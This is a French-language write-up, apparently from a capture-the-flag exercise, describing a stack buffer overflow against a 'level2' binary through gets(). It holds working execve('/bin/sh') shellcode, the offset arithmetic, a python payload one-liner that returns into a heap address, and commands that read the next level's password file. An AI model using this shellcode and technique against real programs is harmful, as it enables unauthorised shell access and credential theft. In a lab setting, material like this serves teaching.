@@ -1,0 +1,36 @@
+En faisant un dump nous voyons de nouveau la fonction gets, que nous allons essayer d'exploiter une fois de plus.
+
+Etant donné que nos adresses esp commencent toutes par 0xb on rentre directement dans le if ce qui lance la fonction exit
+ce qui nous sort de la fonction sans passer par la return adresse.
+
+Le probleme maintenant est que nous devons aussi utiliser l'adresse d'une fonction qui nous permet de lancer 
+de lancer un nouveau shell.
+
+Apres recheche on vois que l'adresse de strdup n'est pas sur la stack mais sur le tas car elle utilise malloc.
+
+On vas vérifier si les adresses sont aléatoires et pour cela on vas voir si l'aslr 
+(Address space layout randomization) est activé ou non.
+
+    cat /proc/sys/kernel/randomize_va_space
+
+(si cela nous retourne 1 ou 2 cela veux dire que c'est randomisé)
+
+vue que les adresse sont toujours les mêmes on sait qu'on vas pouvoir l'exploiter en modifiant l'eip
+
+allocation (buff[64] + return ardress[12])[76] + push ebp[4] = 80.
+
+Du coup on vas chercher sur internet un shellcode qui correspond à execve('/bin/sh') sous un environnement x86 et on trouve le suivant: 
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+    ( http://shell-storm.org/shellcode/files/shellcode-811.php )
+qui fait 28 octets.
+
+Ce qui nous donne donc (80 - 28) =>  52 
+
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 +  "\x08\xa0\x04\x08"'
+
+on envoie cela dans un fichier sur /tmp 
+
+
+cat /tmp/lvl2 - | ./level2
+
+cat /home/user/level3/.pass
